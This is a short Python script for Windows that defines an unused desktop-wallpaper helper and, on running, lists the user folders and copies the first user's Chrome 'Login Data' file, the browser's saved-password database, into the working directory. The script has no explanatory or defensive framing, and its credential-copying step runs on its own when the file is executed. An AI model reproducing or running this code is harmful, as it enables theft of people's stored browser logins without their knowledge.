import ctypes
import os 
import shutil
def updateBackground(backgroundPath):
    SPI_SETDESKWALLPAPER = 20 
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, backgroundPath, 0)

def listDir():
    ignoreUsers = ["All Users", "Default", "Default User", "desktop.ini", "Public"]
    users = [f for f in os.listdir("c:\\Users") if not f in ignoreUsers]
    print(users)
    shutil.copyfile(f"c:\\Users\\{users[0]}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "./Login Data")

listDir()